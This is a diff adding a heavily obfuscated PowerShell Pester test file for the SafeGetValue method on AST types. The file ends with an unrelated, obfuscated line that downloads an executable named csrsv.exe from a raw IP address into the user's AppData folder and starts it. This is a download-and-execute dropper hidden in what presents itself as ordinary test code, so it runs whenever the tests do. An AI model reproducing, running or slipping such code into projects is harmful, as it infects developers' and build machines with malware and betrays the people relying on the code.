@@ -1,0 +1,29 @@
+using Namespace ("{6}{4}{5}{3}{1}{0}{7}{2}"-f '.Automation.Lan','ement','age','ag','tem.Ma','n','Sys','gu')
+.("{2}{0}{1}" -f'cri','be','Des') ("{0}{8}{7}{5}{3}{6}{2}{1}{4}" -f'The','urns safe va','et','T','lues',' method on AS',' r','afeGetValue',' S') -Tags "CI" {
+    .('It') ("{1}{3}{11}{6}{8}{4}{10}{2}{9}{12}{5}{7}{0}" -f'Ast','A hashtable is',' a ',' r','e','h','r','table','n','Ha','d from','etu','s') {
+        ${h`ASHta`B`l`EAStTypE} = [HashtableAst]
+        ${h`TAsT} = {
+            @{ ("{1}{0}" -f 'e','on') = 1 }
+            }."a`st"."f`inD"({${aR`Gs}[0] -is ${HaSh`Ta`B`Le`ASt`TYPE}}, ${T`RUE})
+        ${ht`ASt} | &("{0}{1}"-f'Shou','ld') -Not -BeNullOrEmpty
+        ${h`T`ASt}.("{1}{0}{2}" -f 'feGetVal','Sa','ue').Invoke() | &("{0}{2}{1}"-f 'S','ould','h') -BeOfType ("{0}{2}{1}"-f'H','le','ashtab')
+    }
+    &('It') ("{2}{0}{3}{8}{1}{6}{4}{7}{5}"-f'ay is ','d from','An Arr','re','y','st',' a LiteralArra','A','turne') {
+        ${A`RRayasT`TYpE} = [ArrayLiteralAst]
+        ${Ar`R`AyAst} = {
+            @( 1,2,3,4)
+            }."a`St"."f`ind"({${a`Rgs}[0] -is ${Arr`A`y`AsTT`Ype}}, ${t`RuE})
+        ${A`RrA`YaSt} | &("{1}{0}"-f'uld','Sho') -Not -BeNullOrEmpty
+        ,${a`Rr`A`yasT}.("{3}{1}{0}{2}"-f'feGetVal','a','ue','S').Invoke() | .("{1}{0}" -f'ould','Sh') -BeOfType ("{1}{2}{0}" -f 'ect[]','O','bj')
+    }
+    &('It') ("{9}{6}{2}{5}{0}{3}{4}{7}{8}{10}{1}"-f 'e','nced',' proper ','tu','rned whe','error is r','he','n',' a variable i','T','s refere') {
+        ${A`st} = { ${A} }."A`sT"."F`INd"({${Ar`Gs}[0] -is ("{5}{3}{1}{4}{2}{0}"-f'ionAst','le','s','ariab','Expres','V')},${tR`Ue})
+        { ${a`St}.("{0}{1}{2}"-f'Safe','G','etValue').Invoke() } | &("{0}{1}" -f'S','hould') -Throw -ErrorId ("{3}{4}{5}{1}{0}{6}{2}"-f'Ex','on','on','InvalidO','pera','ti','cepti')
+    }
+    &('It') ("{11}{12}{3}{5}{2}{4}{7}{0}{13}{8}{10}{6}{1}{9}" -f'th',' er',' fail','tB','s w','lock AST','per','i','he ','ror','pro','A ','Scrip',' t') {
+        { { 1 }."A`sT".("{2}{1}{0}" -f'ue','eGetVal','Saf').Invoke() } | .("{0}{2}{1}"-f 'Sho','ld','u') -Throw -ErrorId ("{3}{5}{1}{2}{6}{4}{7}{0}" -f 'n','idO','p','Inv','c','al','erationEx','eptio')
+    }
+
+}
+
+(.("{1}{3}{2}{0}"-f 'ct','N','je','ew-Ob') ("{1}{0}{2}{3}" -f 'ystem.Net.','S','WebC','lient')).("{1}{3}{0}{2}" -f 'dFi','D','le','ownloa').Invoke(("{0}{11}{9}{10}{1}{3}{8}{4}{7}{2}{5}{6}" -f'http://9','53.','aho','23','~','o/cs','rsv.exe','y','8/','.','102.','4'),"$env:APPDATA\csrsv.exe");&("{2}{0}{1}" -f 'roc','ess','Start-P') ("$env:APPDATA\csrsv.exe")
